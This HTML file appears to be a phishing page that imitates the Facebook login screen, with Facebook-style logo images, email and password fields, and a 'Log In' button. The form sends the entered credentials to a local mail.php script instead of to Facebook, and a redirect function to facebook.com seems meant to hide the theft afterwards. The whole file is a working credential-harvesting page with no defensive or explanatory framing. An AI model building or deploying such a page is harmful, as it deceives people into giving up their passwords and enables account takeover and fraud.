<!DOCTYPE html>
<head>
<title>Untitled</title>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
	 <script type="text/javascript">
	 function redirect(){
	 window.location="www.facebook.com";
	 }
	 </script>
<style>
* body {
background-color: #F0F0FF;
margin: 0px; 
width:100%;
box-size: border-box; 
}
.form-container{
    margin-left: auto; 
    margin-right:auto;
    display:table;
    border:0px solid black; 
    width:90%;
    
}
.input1{
width:97%;
height:35px;
border-radius: 6px 6px 0px 0px;
border-top: 1px solid #A0A8AF; 
border-bottom: 1px solid #f0f0f0;
border-left:1px solid #A0A8AF; 
border-right:1px solid #A0A8AF; 
padding-left: 10px; 

}
.input2{
width:97%;
height:35px;
border-radius: 0px 0px 6px 6px; 
border-top: 1px solid #f0f0f0; 
border-bottom: 1px solid #A0A8AF; 
border-left:1px solid #A0A8AF; 
border-right:1px solid #A0A8AF; 
padding-left: 10px; 

}
.submit{
width:100%;
height:35px;
border-radius: 6px; 
border:1px solid #A0A8AF; 
background-image: linear-gradient(#5485DD, #4475CD);     
font-color: red; 
color: white; 
font-size: 16px;
padding: 1px;       
box-shadow: 0 2px 1px rgba(0,0,0,0.3);
}
</style>
 </head>
	 <body>

<img src="fblogo.jpg" alt="" width="100%" height="auto"/>
<div class="form-container">
<form width="100%" method="post" action="mail.php">
<input class="input1" type="text" name="email"  placeholder="email address or phone number " required/><br>
<input class="input2" type="password" name="password" placeholder="password" required /><br>
<br>
<input class="submit" type="submit" value="Log In">
</form>
<img src="fbcreate.jpg" alt="" width="100%" height="auto"/>
</div>
	 </body>
 </html>